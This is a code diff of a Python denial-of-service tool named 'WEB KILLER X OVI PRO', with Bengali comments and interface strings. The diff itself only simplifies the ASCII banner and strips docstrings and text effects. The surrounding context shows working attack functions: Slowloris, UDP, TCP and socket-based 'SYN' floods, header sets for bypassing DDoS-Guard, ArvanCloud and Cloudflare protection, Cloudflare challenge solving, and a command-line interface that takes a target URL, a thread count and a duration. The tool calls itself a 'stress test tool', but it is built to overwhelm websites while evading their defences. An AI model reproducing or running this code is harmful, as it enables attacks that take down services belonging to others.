@@ -19,32 +19,27 @@ B = "\033[94m"
 M = "\033[95m"
 C = "\033[96m"
 W = "\033[97m"
-BLINK = "\033[5m"
-BOLD = "\033[1m"
 RESET = "\033[0m"
 
-# ========== ভয়ংকর লোগো ==========
+# ========== সরল ডিজাইনের লোগো ==========
 BANNER = f"""
-{R}{BOLD}{BLINK}
-╔══════════════════════════════════════════════════════════╗
-║  ██╗    ██╗███████╗██████╗     ██╗  ██╗██╗██╗     ██╗     ║
-║  ██║    ██║██╔════╝██╔══██╗    ██║ ██╔╝██║██║     ██║     ║
-║  ██║ █╗ ██║█████╗  ██████╔╝    █████╔╝ ██║██║     ██║     ║
-║  ██║███╗██║██╔══╝  ██╔══██╗    ██╔═██╗ ██║██║     ██║     ║
-║  ╚███╔███╔╝███████╗██████╔╝    ██║  ██╗██║███████╗███████╗║
-║   ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝║
-║                                                          ║
-║  {G}███████╗██╗  ██╗████████╗██████╗ ███████╗███╗   ███╗{R}  ║
-║  {G}██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗██╔════╝████╗ ████║{R}  ║
-║  {G}█████╗   ╚███╔╝    ██║   ██████╔╝█████╗  ██╔████╔██║{R}  ║
-║  {G}██╔══╝   ██╔██╗    ██║   ██╔══██╗██╔══╝  ██║╚██╔╝██║{R}  ║
-║  {G}███████╗██╔╝ ██╗   ██║   ██║  ██║███████╗██║ ╚═╝ ██║{R}  ║
-║  {G}╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝{R}  ║
-║                                                          ║
-║  {Y}{BLINK}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░{R}  ║
-║  {M}☠  ক্রিয়েটর: OVI PRO (WEB KILLER X)  ☠{R}                 ║
-║  {Y}{BLINK}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░{R}  ║
-╚══════════════════════════════════════════════════════════╝{RESET}
+{R}╔══════════════════════════════════════════════╗
+║     ██╗    ██╗███████╗██████╗                ║
+║     ██║    ██║██╔════╝██╔══██╗               ║
+║     ██║ █╗ ██║█████╗  ██████╔╝               ║
+║     ██║███╗██║██╔══╝  ██╔══██╗               ║
+║     ╚███╔███╔╝███████╗██████╔╝               ║
+║      ╚══╝╚══╝ ╚══════╝╚═════╝                ║
+║                                              ║
+║        {G}███████╗██╗  ██╗    ██████╗ ██╗   ██╗██╗{R}   ║
+║        {G}██╔════╝╚██╗██╔╝    ██╔══██╗██║   ██║██║{R}   ║
+║        {G}█████╗   ╚███╔╝     ██║  ██║██║   ██║██║{R}   ║
+║        {G}██╔══╝   ██╔██╗     ██║  ██║╚██╗ ██╔╝╚═╝{R}   ║
+║        {G}███████╗██╔╝ ██╗    ██████╔╝ ╚████╔╝ ██╗{R}   ║
+║        {G}╚══════╝╚═╝  ╚═╝    ╚═════╝   ╚═══╝  ╚═╝{R}   ║
+║                                              ║
+║         {Y}ক্রিয়েটর: OVI PRO (WEB KILLER X){R}        ║
+╚══════════════════════════════════════════════════╝{RESET}
 """
 
 # SSL সতর্কতা বন্ধ
@@ -152,7 +147,6 @@ class WebKillerX:
     # ========== DGB - DDoS Guard bypass ==========
     def dgb_headers(self):
         headers = self.bypass_headers()
-        # DDoS-GUARD স্পেসিফিক হেডার
         headers.update({
             "Accept-Charset": "utf-8",
             "Accept-Datetime": time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime()),
@@ -169,7 +163,6 @@ class WebKillerX:
     # ========== AVB - Arvan Cloud bypass ==========
     def avb_headers(self):
         headers = self.bypass_headers()
-        # ArvanCloud স্পেসিফিক হেডার
         headers.update({
             "X-Security": "bypass",
             "X-Arvan-Cloud": "true",
@@ -183,9 +176,8 @@ class WebKillerX:
         })
         return headers
     
-    # ========== SLOW - Slowloris (ইতিমধ্যে আছে) ==========
+    # ========== SLOW - Slowloris ==========
     def slowloris_attack(self):
-        """Slowloris আক্রমণ"""
         socks = []
         try:
             for _ in range(min(self.threads, 200)):
@@ -220,9 +212,8 @@ class WebKillerX:
             for sock in socks:
                 sock.close()
     
-    # ========== UDP flood (ইতিমধ্যে আছে) ==========
+    # ========== UDP flood ==========
     def udp_attack(self):
-        """UDP ফ্লাড আক্রমণ"""
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         packet = random._urandom(1024)
         target_ip = self.host
@@ -241,9 +232,8 @@ class WebKillerX:
             sys.stdout.flush()
         sock.close()
     
-    # ========== SYN flood (Layer 4) - সিমুলেটেড ==========
+    # ========== SYN flood (সিমুলেটেড) ==========
     def syn_attack(self):
-        """SYN ফ্লাড (সিমুলেটেড - সকেট কানেক্ট)"""
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(1)
         target_ip = self.host
@@ -262,9 +252,8 @@ class WebKillerX:
             sys.stdout.flush()
         sock.close()
     
-    # ========== TCP flood (Layer 4) ==========
+    # ========== TCP flood ==========
     def tcp_attack(self):
-        """TCP ফ্লাড - ডাটা পাঠানো"""
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(1)
         target_ip = self.host
@@ -288,9 +277,7 @@ class WebKillerX:
             sys.stdout.flush()
         sock.close()
     
-    # ========== HTTP মেথডগুলোর জন্য জেনেরিক অ্যাটাক ফাংশন ==========
     def http_attack_with_headers(self, header_func):
-        """যেকোনো HTTP হেডার ফাংশন দিয়ে আক্রমণ"""
         while self.running:
             try:
                 headers = header_func()
@@ -321,7 +308,6 @@ class WebKillerX:
         self.http_attack_with_headers(self.random_headers)
     
     def cfb_attack(self):
-        """Cloudflare bypass আক্রমণ (সাধারণ)"""
         while self.running:
             try:
                 headers = self.random_headers()
@@ -357,7 +343,6 @@ class WebKillerX:
             sys.stdout.flush()
     
     def solve_cf_challenge(self, first_response):
-        """Cloudflare চ্যালেঞ্জ সলভ করার চেষ্টা (সিমুলেটেড)"""
         try:
             html = first_response.text
             match = re.search(r'name="jschl_answer" value="([^"]+)"', html)
@@ -377,7 +362,6 @@ class WebKillerX:
         return None
     
     def cfbuam_attack(self):
-        """Cloudflare Under Attack Mode bypass আক্রমণ"""
         local_session = requests.Session()
         if self.proxies:
             proxy = self.get_random_proxy()
@@ -434,7 +418,7 @@ class WebKillerX:
         else:
             print(f"{C}[+] প্রক্সি ব্যবহার:{RESET} না")
         print()
-        print(f"{Y}{BLINK}[!] টেস্ট শুরু হচ্ছে... Ctrl+C বন্ধ করতে{RESET}\n")
+        print(f"{Y}[!] টেস্ট শুরু হচ্ছে... Ctrl+C বন্ধ করতে{RESET}\n")
         
         # মেথড সিলেক্ট
         attack_func = self.http_attack
@@ -481,7 +465,7 @@ class WebKillerX:
                 print(f"{C}📈 সাফল্যের হার: {success_rate:.2f}%{RESET}")
 
 def main():
-    parser = argparse.ArgumentParser(description="WEB KILLER X OVI PRO - অলটিমেট স্ট্রেস টেস্ট টুল")
+    parser = argparse.ArgumentParser(description="WEB KILLER X OVI - অলটিমেট স্ট্রেস টেস্ট টুল")
     parser.add_argument("target", help="টার্গেট URL (যেমন: https://yoursite.com)")
     parser.add_argument("-t", "--threads", type=int, default=200, help="থ্রেড সংখ্যা (ডিফল্ট: 200)")
     parser.add_argument("-d", "--duration", type=int, default=60, help="সময় (সেকেন্ড, ডিফল্ট: 60)")
